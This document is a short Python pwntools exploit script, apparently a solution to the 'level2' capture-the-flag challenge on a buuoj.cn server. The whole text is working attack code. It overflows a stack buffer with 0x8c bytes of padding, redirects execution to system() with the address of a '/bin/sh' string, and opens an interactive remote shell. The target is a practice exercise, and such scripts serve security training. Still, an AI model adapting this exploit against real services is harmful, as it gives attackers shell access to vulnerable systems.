from pwn import *
io=remote('node3.buuoj.cn',25456)
elf = ELF('./level2')

system_addr=elf.plt['system']
binsh=0x804A024

payload=cyclic(0x8c)+p32(system_addr)+p32(0xdeadbeef)+p32(binsh)
io.sendline(payload)
io.interactive()
